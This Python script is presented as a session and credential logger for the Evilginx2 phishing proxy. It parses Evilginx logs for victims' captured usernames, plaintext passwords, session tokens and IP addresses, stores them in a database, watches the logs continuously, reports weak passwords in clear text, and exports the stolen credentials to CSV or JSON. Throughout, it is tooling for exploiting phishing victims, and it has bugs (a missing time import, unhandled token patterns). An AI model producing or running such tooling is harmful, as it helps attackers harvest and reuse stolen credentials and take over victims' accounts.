#!/usr/bin/env python3

"""
Session & Credential Logging for Evilginx2 v3.4.1
Advanced log parsing and analysis for captured credentials and session tokens
"""

import os
import re
import json
import csv
import sqlite3
import hashlib
import argparse
import logging
from datetime import datetime, timedelta
from pathlib import Path
from collections import defaultdict
from dataclasses import dataclass
from typing import List, Dict, Any, Optional
import configparser

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('logs/session_logger.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

@dataclass
class SessionData:
    """Data class for session information"""
    session_id: str
    timestamp: datetime
    target_domain: str
    victim_ip: str
    user_agent: str
    username: Optional[str] = None
    password: Optional[str] = None
    tokens: Dict[str, str] = None
    cookies: Dict[str, str] = None
    phishlet: Optional[str] = None
    status: str = "active"
    
    def __post_init__(self):
        if self.tokens is None:
            self.tokens = {}
        if self.cookies is None:
            self.cookies = {}

class SessionLogger:
    """Main session logging and analysis class"""
    
    def __init__(self, config_file: str = "config.conf"):
        self.config = self.load_config(config_file)
        self.db_path = "logs/sessions.db"
        self.log_paths = self.get_log_paths()
        self.init_database()
        
    def load_config(self, config_file: str) -> configparser.ConfigParser:
        """Load configuration from file"""
        config = configparser.ConfigParser()
        if os.path.exists(config_file):
            config.read(config_file)
        return config
        
    def get_log_paths(self) -> List[str]:
        """Get list of log file paths to monitor"""
        log_paths = []
        
        # Default Evilginx2 log locations
        default_paths = [
            "logs/evilginx.log",
            "logs/sessions.log",
            "/var/log/evilginx/sessions.log",
            "/opt/evilginx2/logs/sessions.log"
        ]
        
        for path in default_paths:
            if os.path.exists(path):
                log_paths.append(path)
                
        return log_paths
        
    def init_database(self):
        """Initialize SQLite database for storing session data"""
        os.makedirs("logs", exist_ok=True)
        
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Create sessions table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT UNIQUE,
                timestamp DATETIME,
                target_domain TEXT,
                victim_ip TEXT,
                user_agent TEXT,
                username TEXT,
                password TEXT,
                tokens TEXT,
                cookies TEXT,
                phishlet TEXT,
                status TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Create credentials table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT,
                domain TEXT,
                username TEXT,
                password TEXT,
                password_hash TEXT,
                timestamp DATETIME,
                source TEXT,
                FOREIGN KEY (session_id) REFERENCES sessions (session_id)
            )
        ''')
        
        # Create tokens table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS tokens (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT,
                token_type TEXT,
                token_value TEXT,
                token_hash TEXT,
                timestamp DATETIME,
                expires_at DATETIME,
                FOREIGN KEY (session_id) REFERENCES sessions (session_id)
            )
        ''')
        
        conn.commit()
        conn.close()
        
    def parse_evilginx_log(self, log_file: str) -> List[SessionData]:
        """Parse Evilginx2 log files for session data"""
        sessions = []
        
        if not os.path.exists(log_file):
            logger.warning(f"Log file not found: {log_file}")
            return sessions
            
        try:
            with open(log_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    session_data = self.parse_log_line(line.strip())
                    if session_data:
                        sessions.append(session_data)
                        
        except Exception as e:
            logger.error(f"Error parsing log file {log_file}: {e}")
            
        return sessions
        
    def parse_log_line(self, line: str) -> Optional[SessionData]:
        """Parse individual log line for session information"""
        # Evilginx2 log patterns
        patterns = {
            'session_created': r'\[(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})\] \[(\w+)\] \[([^\]]+)\] new session created with ID: ([a-f0-9]+)',
            'credentials_captured': r'\[(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})\] \[(\w+)\] \[([^\]]+)\] credentials captured for user: ([^,]+), password: ([^,]+)',
            'token_captured': r'\[(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})\] \[(\w+)\] \[([^\]]+)\] captured token: ([^=]+)=([^\s]+)',
            'session_expired': r'\[(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})\] \[(\w+)\] \[([^\]]+)\] session ([a-f0-9]+) expired'
        }
        
        for pattern_name, pattern in patterns.items():
            match = re.search(pattern, line)
            if match:
                return self.create_session_from_match(pattern_name, match, line)
                
        return None
        
    def create_session_from_match(self, pattern_name: str, match: re.Match, line: str) -> Optional[SessionData]:
        """Create SessionData object from regex match"""
        try:
            if pattern_name == 'session_created':
                timestamp, level, phishlet, session_id = match.groups()
                return SessionData(
                    session_id=session_id,
                    timestamp=datetime.strptime(timestamp, '%Y-%m-%d %H:%M:%S'),
                    target_domain=self.extract_domain_from_line(line),
                    victim_ip=self.extract_ip_from_line(line),
                    user_agent=self.extract_user_agent_from_line(line),
                    phishlet=phishlet
                )
                
            elif pattern_name == 'credentials_captured':
                timestamp, level, phishlet, username, password = match.groups()
                return SessionData(
                    session_id=self.extract_session_id_from_line(line),
                    timestamp=datetime.strptime(timestamp, '%Y-%m-%d %H:%M:%S'),
                    target_domain=self.extract_domain_from_line(line),
                    victim_ip=self.extract_ip_from_line(line),
                    user_agent="",
                    username=username,
                    password=password,
                    phishlet=phishlet
                )
                
        except Exception as e:
            logger.error(f"Error creating session data: {e}")
            
        return None
        
    def extract_domain_from_line(self, line: str) -> str:
        """Extract domain from log line"""
        domain_match = re.search(r'(?:https?://)?([\w.-]+\.[a-z]{2,})', line)
        return domain_match.group(1) if domain_match else "unknown"
        
    def extract_ip_from_line(self, line: str) -> str:
        """Extract IP address from log line"""
        ip_match = re.search(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', line)
        return ip_match.group(0) if ip_match else "unknown"
        
    def extract_user_agent_from_line(self, line: str) -> str:
        """Extract User-Agent from log line"""
        ua_match = re.search(r'User-Agent: ([^"]+)', line)
        return ua_match.group(1) if ua_match else "unknown"
        
    def extract_session_id_from_line(self, line: str) -> str:
        """Extract session ID from log line"""
        sid_match = re.search(r'session[: ]([a-f0-9]+)', line)
        return sid_match.group(1) if sid_match else "unknown"
        
    def store_session(self, session: SessionData):
        """Store session data in database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        try:
            # Store main session data
            cursor.execute('''
                INSERT OR REPLACE INTO sessions 
                (session_id, timestamp, target_domain, victim_ip, user_agent, 
                 username, password, tokens, cookies, phishlet, status, updated_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                session.session_id,
                session.timestamp,
                session.target_domain,
                session.victim_ip,
                session.user_agent,
                session.username,
                session.password,
                json.dumps(session.tokens),
                json.dumps(session.cookies),
                session.phishlet,
                session.status,
                datetime.now()
            ))
            
            # Store credentials separately if present
            if session.username and session.password:
                password_hash = hashlib.sha256(session.password.encode()).hexdigest()
                cursor.execute('''
                    INSERT INTO credentials 
                    (session_id, domain, username, password, password_hash, timestamp, source)
                    VALUES (?, ?, ?, ?, ?, ?, ?)
                ''', (
                    session.session_id,
                    session.target_domain,
                    session.username,
                    session.password,
                    password_hash,
                    session.timestamp,
                    'evilginx_log'
                ))
                
            # Store tokens separately
            for token_type, token_value in session.tokens.items():
                token_hash = hashlib.sha256(token_value.encode()).hexdigest()
                cursor.execute('''
                    INSERT INTO tokens 
                    (session_id, token_type, token_value, token_hash, timestamp)
                    VALUES (?, ?, ?, ?, ?)
                ''', (
                    session.session_id,
                    token_type,
                    token_value,
                    token_hash,
                    session.timestamp
                ))
                
            conn.commit()
            logger.info(f"Stored session: {session.session_id}")
            
        except Exception as e:
            logger.error(f"Error storing session: {e}")
            conn.rollback()
            
        finally:
            conn.close()
            
    def analyze_credentials(self) -> Dict[str, Any]:
        """Analyze captured credentials for patterns"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        analysis = {
            'total_credentials': 0,
            'unique_users': 0,
            'password_patterns': defaultdict(int),
            'top_domains': defaultdict(int),
            'weak_passwords': [],
            'duplicate_passwords': defaultdict(list),
            'recent_captures': []
        }
        
        try:
            # Get total credentials
            cursor.execute('SELECT COUNT(*) FROM credentials')
            analysis['total_credentials'] = cursor.fetchone()[0]
            
            # Get unique users
            cursor.execute('SELECT COUNT(DISTINCT username) FROM credentials')
            analysis['unique_users'] = cursor.fetchone()[0]
            
            # Analyze passwords
            cursor.execute('SELECT password, username, domain FROM credentials')
            for password, username, domain in cursor.fetchall():
                analysis['top_domains'][domain] += 1
                
                # Check for weak passwords
                if self.is_weak_password(password):
                    analysis['weak_passwords'].append({
                        'username': username,
                        'domain': domain,
                        'password': password
                    })
                    
                # Check for duplicate passwords
                analysis['duplicate_passwords'][password].append(username)
                
                # Analyze password patterns
                analysis['password_patterns'][self.get_password_pattern(password)] += 1
                
            # Get recent captures (last 24 hours)
            cursor.execute('''
                SELECT username, domain, timestamp 
                FROM credentials 
                WHERE timestamp > datetime('now', '-1 day')
                ORDER BY timestamp DESC
                LIMIT 10
            ''')
            analysis['recent_captures'] = [
                {'username': u, 'domain': d, 'timestamp': t}
                for u, d, t in cursor.fetchall()
            ]
            
        except Exception as e:
            logger.error(f"Error analyzing credentials: {e}")
            
        finally:
            conn.close()
            
        return analysis
        
    def is_weak_password(self, password: str) -> bool:
        """Check if password is weak"""
        weak_patterns = [
            r'^password\d*$',
            r'^123456\d*$',
            r'^admin\d*$',
            r'^welcome\d*$',
            r'^qwerty\d*$',
            r'^\w{1,5}$'  # Very short passwords
        ]
        
        for pattern in weak_patterns:
            if re.match(pattern, password.lower()):
                return True
                
        return len(password) < 6
        
    def get_password_pattern(self, password: str) -> str:
        """Get password pattern for analysis"""
        if re.match(r'^[a-z]+$', password):
            return 'lowercase_only'
        elif re.match(r'^[A-Z]+$', password):
            return 'uppercase_only'
        elif re.match(r'^[0-9]+$', password):
            return 'numbers_only'
        elif re.match(r'^[a-zA-Z]+$', password):
            return 'letters_only'
        elif re.match(r'^[a-zA-Z0-9]+$', password):
            return 'alphanumeric'
        else:
            return 'complex'
            
    def export_credentials(self, format: str = 'csv', output_file: Optional[str] = None) -> str:
        """Export credentials to various formats"""
        if not output_file:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            output_file = f"exports/credentials_{timestamp}.{format}"
            
        os.makedirs(os.path.dirname(output_file), exist_ok=True)
        
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        try:
            cursor.execute('''
                SELECT s.session_id, s.timestamp, s.target_domain, s.victim_ip, 
                       c.username, c.password, s.phishlet, s.user_agent
                FROM sessions s
                JOIN credentials c ON s.session_id = c.session_id
                ORDER BY s.timestamp DESC
            ''')
            
            data = cursor.fetchall()
            
            if format == 'csv':
                with open(output_file, 'w', newline='', encoding='utf-8') as f:
                    writer = csv.writer(f)
                    writer.writerow([
                        'Session ID', 'Timestamp', 'Domain', 'Victim IP',
                        'Username', 'Password', 'Phishlet', 'User Agent'
                    ])
                    writer.writerows(data)
                    
            elif format == 'json':
                json_data = []
                for row in data:
                    json_data.append({
                        'session_id': row[0],
                        'timestamp': row[1],
                        'domain': row[2],
                        'victim_ip': row[3],
                        'username': row[4],
                        'password': row[5],
                        'phishlet': row[6],
                        'user_agent': row[7]
                    })
                    
                with open(output_file, 'w', encoding='utf-8') as f:
                    json.dump(json_data, f, indent=2, default=str)
                    
            logger.info(f"Exported {len(data)} credentials to {output_file}")
            return output_file
            
        except Exception as e:
            logger.error(f"Error exporting credentials: {e}")
            return ""
            
        finally:
            conn.close()
            
    def generate_report(self) -> str:
        """Generate comprehensive session report"""
        analysis = self.analyze_credentials()
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        report_file = f"reports/session_report_{timestamp}.txt"
        
        os.makedirs(os.path.dirname(report_file), exist_ok=True)
        
        with open(report_file, 'w', encoding='utf-8') as f:
            f.write("=== Evilginx2 Session Analysis Report ===\n")
            f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            
            f.write("=== Summary ===\n")
            f.write(f"Total Credentials Captured: {analysis['total_credentials']}\n")
            f.write(f"Unique Users: {analysis['unique_users']}\n")
            f.write(f"Weak Passwords Found: {len(analysis['weak_passwords'])}\n\n")
            
            f.write("=== Top Target Domains ===\n")
            for domain, count in sorted(analysis['top_domains'].items(), 
                                      key=lambda x: x[1], reverse=True)[:10]:
                f.write(f"{domain}: {count} credentials\n")
            f.write("\n")
            
            f.write("=== Password Patterns ===\n")
            for pattern, count in analysis['password_patterns'].items():
                f.write(f"{pattern}: {count}\n")
            f.write("\n")
            
            f.write("=== Weak Passwords ===\n")
            for weak in analysis['weak_passwords'][:20]:
                f.write(f"{weak['domain']} - {weak['username']}: {weak['password']}\n")
            f.write("\n")
            
            f.write("=== Recent Captures (Last 24h) ===\n")
            for capture in analysis['recent_captures']:
                f.write(f"{capture['timestamp']} - {capture['domain']} - {capture['username']}\n")
                
        logger.info(f"Generated report: {report_file}")
        return report_file
        
    def monitor_logs(self, interval: int = 60):
        """Monitor log files for new entries"""
        logger.info(f"Starting log monitoring with {interval}s interval")
        
        file_positions = {}
        for log_path in self.log_paths:
            if os.path.exists(log_path):
                file_positions[log_path] = os.path.getsize(log_path)
                
        while True:
            try:
                for log_path in self.log_paths:
                    if not os.path.exists(log_path):
                        continue
                        
                    current_size = os.path.getsize(log_path)
                    last_position = file_positions.get(log_path, 0)
                    
                    if current_size > last_position:
                        # File has new content
                        with open(log_path, 'r', encoding='utf-8', errors='ignore') as f:
                            f.seek(last_position)
                            new_lines = f.readlines()
                            
                        for line in new_lines:
                            session_data = self.parse_log_line(line.strip())
                            if session_data:
                                self.store_session(session_data)
                                
                        file_positions[log_path] = current_size
                        
                time.sleep(interval)
                
            except KeyboardInterrupt:
                logger.info("Log monitoring stopped")
                break
            except Exception as e:
                logger.error(f"Error in log monitoring: {e}")
                time.sleep(interval)

def main():
    parser = argparse.ArgumentParser(description='Evilginx2 Session Logger')
    parser.add_argument('--config', default='config.conf', help='Configuration file')
    parser.add_argument('--parse', help='Parse specific log file')
    parser.add_argument('--monitor', action='store_true', help='Monitor logs continuously')
    parser.add_argument('--analyze', action='store_true', help='Analyze captured credentials')
    parser.add_argument('--export', choices=['csv', 'json'], help='Export credentials')
    parser.add_argument('--report', action='store_true', help='Generate analysis report')
    parser.add_argument('--output', help='Output file for export')
    
    args = parser.parse_args()
    
    logger = SessionLogger(args.config)
    
    if args.parse:
        sessions = logger.parse_evilginx_log(args.parse)
        for session in sessions:
            logger.store_session(session)
        print(f"Parsed {len(sessions)} sessions from {args.parse}")
        
    elif args.monitor:
        logger.monitor_logs()
        
    elif args.analyze:
        analysis = logger.analyze_credentials()
        print(json.dumps(analysis, indent=2, default=str))
        
    elif args.export:
        output_file = logger.export_credentials(args.export, args.output)
        print(f"Exported to: {output_file}")
        
    elif args.report:
        report_file = logger.generate_report()
        print(f"Report generated: {report_file}")
        
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
